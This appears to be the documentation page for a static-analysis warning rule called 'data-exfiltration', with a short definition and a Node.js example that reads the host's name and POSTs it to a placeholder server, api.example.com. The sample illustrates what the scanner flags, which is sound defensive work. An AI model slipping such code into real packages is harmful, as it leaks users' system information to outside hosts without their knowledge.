# Data exfiltration 

| Code | Severity | i18n | Experimental |
| --- | --- | --- | :-: |
| data-exfiltration | `Warning` | `sast_warnings.data_exfiltration` | ❌ | 

## Introduction

Data exfiltration is the unauthorized transfer of sensitive data from a computer or network to an external location. This can occur through malicious code, insider threats, or compromised systems.

## Example

```js
import http from "http";
import os from "os";

const postData = os.hostname();

const options = {
  hostname: 'api.example.com',
  port: 80,
  path: '/users',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const request = http.request; 

const req = request(options, (res) => {
  console.log(`Status: ${res.statusCode}`);
  console.log(`Headers: ${JSON.stringify(res.headers)}`);
  
  res.setEncoding('utf8');
  res.on('data', (chunk) => {
    console.log(`Response: ${chunk}`);
  });
});

req.on('error', (e) => {
  console.error(`Request error: ${e.message}`);
});

req.write(postData);
req.end();
```